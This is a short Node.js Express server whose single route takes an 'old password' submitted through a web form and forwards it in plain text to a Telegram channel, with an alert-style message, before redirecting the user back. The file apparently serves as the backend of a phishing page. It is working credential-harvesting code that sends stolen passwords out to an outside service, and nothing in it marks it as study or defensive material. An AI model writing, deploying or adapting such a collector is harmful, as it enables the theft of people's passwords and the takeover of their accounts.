require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = 3000;


const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); 

app.post('/send-password', async (req, res) => {
    const { oldPassword } = req.body;

    if (!oldPassword) {
        return res.status(400).send('Missing old password');
    }

    const message = `🚨 *Old password received:*\n\`${oldPassword}\``;

    try {
        await bot.sendMessage(process.env.TELEGRAM_CHANNEL_ID, message, { parse_mode: 'Markdown' });
        return res.redirect('/');
    } catch (err) {
        console.error('Telegram send failed:', err.message);
        return res.status(500).send('Failed to send to Telegram');
    }
});

app.listen(PORT, () => {
    console.log(` Server running on http://localhost:${PORT}`);
});
